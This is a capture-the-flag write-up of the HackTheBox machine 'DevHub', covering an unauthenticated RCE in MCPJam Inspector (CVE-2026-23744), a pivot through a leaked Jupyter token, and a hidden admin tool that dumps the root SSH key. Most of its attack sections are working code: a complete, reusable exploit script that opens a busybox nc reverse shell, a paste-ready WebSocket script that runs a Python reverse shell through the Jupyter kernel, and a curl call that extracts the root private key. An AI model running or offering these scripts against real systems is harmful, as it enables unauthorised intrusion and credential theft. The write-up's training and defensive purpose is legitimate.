---
title: "HTB - DevHub"
date: 2026-05-30
tags: ["HackTheBox", "Linux", "MCP", "CVE-2026-23744", "Jupyter", "RCE", "SSRF"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/DevHub.png"
---
**Difficulty:** Medium | **OS:** Linux

---

## Logo & Name Analysis - First Impressions

Before touching a single tool, the machine logo and name already give away a significant amount of information to an experienced player.

### The Logo

The machine logo shows a caged beast with red glowing eyes trapped behind bars. On HackTheBox, machine logos almost always hint directly at the technology or theme involved.

**What the logo tells us immediately:**
- **Caged beast behind bars:** A system designed to restrict access, block unsafe operations, or confine environments (sandboxing / containerization).
- **Red glowing eyes:** A powerful or potentially dangerous interface that is supposed to be fully locked down, but might have vulnerabilities in its containment.
- **Caged element:** An environment escape (sandbox escape) or a container escape scenario.

### The Name

"DevHub" combined with the logo points toward:
- A centralized developer platform or gateway (like GitLab, JupyterHub, or a custom tool manager) that coordinates multiple services.
- An environment where developers deploy models, notebooks, or scripts, pointing directly to development-centric protocols like Model Context Protocol (MCP) or Jupyter.

### The Instant Hypothesis

Combining name and logo before even running nmap:
> *"This is a developer platform (DevHub) managing internal development or model tools. The caged beast suggests containerization, sandboxing, or restricted environments that we must escape. The primary attack vector will likely involve exploiting development utilities or container/sandbox escape vulnerabilities."*

This hypothesis is confirmed within minutes of enumeration, revealing an exposed Model Context Protocol (MCP) debugger and Jupyter notebook.

<!--more-->

---

## Summary

DevHub is a Medium-difficulty Linux machine that features a developer platform. Initial access is achieved by exploiting a Remote Code Execution (RCE) vulnerability (CVE-2026-23744) in the publicly exposed MCPJam Inspector v1.4.2 on port 6274. Lateral movement to the `analyst` user is performed by retrieving a leaked Jupyter notebook token from the running process list (`ps aux`) and using a raw Python WebSocket client to execute commands inside a Jupyter kernel. Privilege escalation to `root` is accomplished by analyzing a local Flask-based `opsmcp` server running as root, discovering an unlisted API tool (`ops._admin_dump`), and using it to retrieve the root SSH private key.

---

## Reconnaissance

### Nmap

```bash
nmap -sCV <MACHINE_IP>
```

Open ports:

| Port | Service | Version |
|---|---|---|
| 80 | HTTP | nginx |
| 6274 | Unknown | MCPJam Inspector v1.4.2 |

### Web - devhub.htb (Port 80)

Browsing the homepage reveals the internal developer stack:

| Service | Location | Status |
|---|---|---|
| MCP Inspector | Port 6274 | Active - public |
| Analytics Dashboard | localhost:8888 | Internal only (Jupyter) |
| Code Repository | N/A | Maintenance mode |

**Tech Stack:** Node.js, Python 3, Jupyter, MCP Protocol, Ubuntu 24.04

The most critical detail is that the **MCP Inspector is publicly exposed on port 6274**. MCP (Model Context Protocol) is Anthropic's open standard for connecting AI models to tools and data sources. An inspector or debugger for MCP servers being exposed externally is a severe misconfiguration.

---

## Foothold - CVE-2026-23744 (MCPJam RCE)

### Vulnerability Analysis

**CVE-2026-23744** affects MCPJam Inspector version 1.4.2 and below. The `/api/mcp/connect` endpoint accepts a `serverConfig` object intended for configuring stdio-based MCP servers. However, it spawns the provided command directly via Node.js `child_process.spawn` with **no authentication and no sanitization**, allowing unauthenticated Remote Code Execution.

```json
POST /api/mcp/connect
{
  "serverConfig": {
    "command": "busybox",
    "args": ["nc", "ATTACKER_IP", "PORT", "-e", "/bin/bash"],
    "env": {}
  },
  "serverId": "any-string"
}
```

### Full Exploit - CVE-2026-23744.py

Below is the complete exploit script using only the Python standard library to leverage CVE-2026-23744 and trigger a reverse shell:

```python
#!/usr/bin/env python3
"""
CVE-2026-23744 - MCPJam Inspector Remote Code Execution
Affected : MCPJam <= v1.4.2
Endpoint : POST /api/mcp/connect
Vuln     : Unauthenticated stdio MCP server config executes arbitrary
           commands server-side via Node.js child_process.spawn

Usage:
  python3 CVE-2026-23744.py <target_url> <lhost> <lport>

Example:
  python3 CVE-2026-23744.py http://devhub.htb:6274 10.10.16.26 4444
"""

import sys
import json
import urllib.request
import urllib.error

def banner():
    print("""
  ██████╗██╗   ██╗███████╗      ██████╗  ██████╗ ██████╗ ██████╗
  ██╔════╝██║   ██║██╔════╝     ╚════██╗██╔═══██╗╚════██╗██╔════╝
  ██║     ██║   ██║█████╗        █████╔╝██║   ██║ █████╔╝███████╗
  ██║     ╚██╗ ██╔╝██╔══╝       ██╔═══╝ ██║   ██║██╔═══╝ ╚════██║
  ╚██████╗ ╚████╔╝ ███████╗     ███████╗╚██████╔╝███████╗██████╔╝
  ╚═════╝  ╚═══╝  ╚══════╝     ╚══════╝ ╚═════╝ ╚══════╝╚═════╝
  CVE-2026-23744 | MCPJam <= v1.4.2 | Unauthenticated RCE
""")

def build_payload(lhost: str, lport: str) -> dict:
    """
    MCPJam's /api/mcp/connect accepts a serverConfig for stdio-based
    MCP servers and spawns the command directly - no auth, no sanitization.
    We abuse this with busybox nc to get a reverse shell.
    """
    return {
        "serverConfig": {
            "command": "busybox",
            "args": ["nc", lhost, lport, "-e", "/bin/bash"],
            "env": {}
        },
        "serverId": "pwned-by-cve-2026-23744"
    }

def exploit(target: str, lhost: str, lport: str):
    endpoint = target.rstrip('/') + "/api/mcp/connect"

    print(f"[*] Target   : {target}")
    print(f"[*] Endpoint : {endpoint}")
    print(f"[*] LHOST    : {lhost}")
    print(f"[*] LPORT    : {lport}")
    print(f"[!] Start listener: nc -lvnp {lport}\n")

    payload = json.dumps(build_payload(lhost, lport)).encode()

    req = urllib.request.Request(
        endpoint,
        data=payload,
        headers={
            "Content-Type": "application/json",
            "Accept":        "application/json, text/event-stream"
        },
        method="POST"
    )

    try:
        print(f"[*] Sending payload ...")
        with urllib.request.urlopen(req, timeout=15) as resp:
            status = resp.status
            body   = resp.read(512).decode(errors="replace")
            print(f"[*] Status : {status}")
            print(f"[*] Body   : {body[:200]}")
            if status in (200, 201, 202):
                print("\n[+] Payload accepted! Check your listener.")
            else:
                print(f"\n[?] Unexpected status {status} - inspect manually.")

    except urllib.error.HTTPError as e:
        print(f"[*] HTTP {e.code}")
        if e.code == 404:
            print("[-] 404 - wrong endpoint path.")
        elif e.code == 500:
            print("[~] 500 - command may still have executed. Check listener.")
        else:
            print(f"[?] {e.reason}")

    except TimeoutError:
        # nc holds the socket open -> request hangs -> Python raises TimeoutError
        print("\n[+] Request timed out - shell likely connected!")
        print("[+] Check your listener NOW.")

    except Exception as e:
        print(f"\n[-] Error: {e}")

def main():
    banner()
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <lhost> <lport>")
        print(f"  e.g: python3 {sys.argv[0]} http://devhub.htb:6274 10.10.16.26 4444")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])

if __name__ == "__main__":
    main()
```

### Running the Exploit

We can trigger this vulnerability to obtain a reverse shell. First, we start a listener on our attacker machine:

```bash
nc -lvnp 4444
```

Then, we fire our exploit payload:

```bash
python3 CVE-2026-23744.py http://devhub.htb:6274 10.10.16.26 4444
```

This returns a shell connection on our listener:

```
connect to [10.10.16.26] from (UNKNOWN) [10.129.8.53] 50396
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

We obtain a shell as the `mcp-dev` user (uid=1001).

### Shell Stabilization

We stabilize our shell using Python:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement - mcp-dev to analyst

### Discovering Jupyter Token

We perform local enumeration to find a path to escalate privileges or pivot users:

```bash
ps aux | grep jupyter
```

```
analyst  1042  /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

The Jupyter token is **exposed directly in the process arguments**, which is readable by any local user via `ps aux`.

We also spot another running process:
```
root  1048  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The `opsmcp` server runs as **root**, which will be our eventual target for privilege escalation.

### Jupyter API Access via Raw WebSocket

Standard Python modules like `requests`, `websocket-client`, and `jupyter_client` are not installed or available as `mcp-dev`. We must use the Python standard library to implement the complete WebSocket protocol manually.

**One-shot bash script - create kernel and WebSocket reverse shell (pure stdlib, no pip):**

First, open a second terminal listener on Kali:

```bash
nc -lvnp 4443
```

Then, copy and paste the entire block below into the target `mcp-dev` shell:

```bash
KERNEL=$(python3 -c "
import urllib.request, json
req = urllib.request.Request(
    'http://127.0.0.1:8888/api/kernels',
    data=b'{\"name\":\"python3\"}',
    headers={'Authorization':'token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7','Content-Type':'application/json'},
    method='POST'
)
r = urllib.request.urlopen(req)
print(json.loads(r.read())['id'])
")
echo "[*] Kernel: $KERNEL"
sleep 3

python3 << EOF
import socket, base64, json, uuid, os, struct, time

TOKEN     = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "$KERNEL"
LHOST     = "10.10.16.26"
LPORT     = 4443

CODE = (
    "import socket,os,pty\n"
    "s=socket.socket()\n"
    "s.connect(('" + "10.10.16.26" + "'," + "4443" + "))\n"
    "os.dup2(s.fileno(),0)\n"
    "os.dup2(s.fileno(),1)\n"
    "os.dup2(s.fileno(),2)\n"
    "pty.spawn('/bin/bash')\n"
)

# WebSocket handshake
s = socket.socket()
s.connect(("127.0.0.1", 8888))
ws_key = base64.b64encode(os.urandom(16)).decode()
s.send((
    f"GET /api/kernels/{KERNEL_ID}/channels HTTP/1.1\r\n"
    f"Host: 127.0.0.1:8888\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {ws_key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n"
    f"Authorization: token {TOKEN}\r\n\r\n"
).encode())

resp = b""
while b"\r\n\r\n" not in resp:
    resp += s.recv(4096)
print("[+]", resp.split(b"\r\n")[0].decode())

def ws_encode(data):
    mask   = os.urandom(4)
    length = len(data)
    header = b'\x81'
    if length < 126:
        header += struct.pack('B', length | 0x80)
    elif length < 65536:
        header += struct.pack('!BH', 254, length)
    else:
        header += struct.pack('!BQ', 255, length)
    return header + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(data))

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Socket closed")
        buf += chunk
    return buf

def ws_recv(sock):
    h      = recv_exact(sock, 2)
    opcode = h[0] & 0x0f
    masked = (h[1] & 0x80) != 0
    length = h[1] & 0x7f
    if length == 126: length = struct.unpack('!H', recv_exact(sock, 2))[0]
    elif length == 127: length = struct.unpack('!Q', recv_exact(sock, 8))[0]
    mask_key = recv_exact(sock, 4) if masked else b""
    payload  = recv_exact(sock, length)
    if masked: payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    return opcode, payload

time.sleep(2)

msg = json.dumps({
    "header": {
        "msg_id":   str(uuid.uuid4()),
        "username": "x",
        "session":  str(uuid.uuid4()),
        "msg_type": "execute_request",
        "version":  "5.3"
    },
    "parent_header": {},
    "metadata":      {},
    "content": {
        "code":             CODE,
        "silent":           False,
        "store_history":    False,
        "user_expressions": {},
        "allow_stdin":      False
    }
}).encode()

s.send(ws_encode(msg))
s.settimeout(10)
print("[*] Payload sent - check listener!\n")

for _ in range(8):
    try:
        opcode, payload = ws_recv(s)
        data = json.loads(payload)
        t = data.get("msg_type", "")
        print(f"[DBG] {t}")
        if t == "error":
            print("ERR:", data["content"]["evalue"]); break
        if t == "status" and data["content"]["execution_state"] == "idle":
            break
    except Exception:
        break

s.close()
EOF
```

With our listener active on port 4443, we successfully receive a shell back:

```
connect to [10.10.16.26] from (UNKNOWN) [10.129.8.53] ...
analyst@devhub:/opt/opsmcp$
```

We now have a shell as the `analyst` user.

### User Flag

We can read the user flag:

```bash
cat /home/analyst/user.txt
```

---

## Privilege Escalation - analyst to root

### OPSMCP Server Analysis

The Flask-based `opsmcp` server runs as **root** on `127.0.0.1:5000`. We inspect its source code:

```bash
cat /opt/opsmcp/server.py
```

Key configuration and endpoints:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}
```

The hidden tool `ops._admin_dump` accepts the argument `target=ssh_keys` and returns the contents of `/root/.ssh/id_rsa`. While it is not listed in the public `/tools/list` endpoint, it is fully callable via `/tools/call`.

### Dumping Root SSH Key

We make a request to the `/tools/call` endpoint using the discovered API key:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

This returns the root private key:

```json
{
  "target": "ssh_keys",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...",
  "note": "Emergency recovery key dump"
}
```

### SSH as Root

We save the private key and connect to the target machine:

```bash
# Save and restrict permissions on the key
echo "<KEY>" > /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@10.129.8.53
```

We successfully obtain root access:

```bash
root@devhub:~# cat /root/root.txt
```

---

## Attack Chain Summary

```
CVE-2026-23744 (MCPJam RCE on Port 6274)
                 │
                 ▼
          Shell as mcp-dev
                 │
                 ▼
    Process list inspection (ps aux)
      - Jupyter token leaked
                 │
                 ▼
  Jupyter WebSocket API on localhost:8888
  - execute_request reverse shell
                 │
                 ▼
          Shell as analyst
                 │
                 ▼
  /opt/opsmcp/server.py investigation
   - API key + hidden tool discovered
                 │
                 ▼
  Tool call: ops._admin_dump
   - Retrieves root SSH key
                 │
                 ▼
           SSH as root
                 │
                 ▼
        Root Flag obtained
```

---

## Key Takeaways

- **AI and MCP Security:** CVE-2026-23744 highlights the risks of rapidly deploying emerging AI toolchains and Model Context Protocol (MCP) integrations without complete security reviews. Exposing an MCP debugger publicly allows attackers to configure and spawn arbitrary stdio servers, essentially granting them an unauthenticated shell.
- **Process Argument Leakage:** Passing sensitive information (like Jupyter access tokens) via command-line flags (e.g., `--ServerApp.token`) makes them visible to any local user via standard utilities like `ps`. Secrets should instead be passed through environment variables or restricted configuration files.
- **Obscurity is Not Security:** Relying on unlisted API endpoints (like `ops._admin_dump`) for administrative tasks fails to provide real security. If a client can invoke the endpoint, an attacker with the API key can discover and abuse it regardless of whether it is officially documented.

---

## Tools Used

- `nmap` - Network reconnaissance
- `curl` - Web API requests
- `python3` - Raw WebSocket script execution
- `nc` - Reverse shell listeners

---

*z3r0s - HackTheBox*
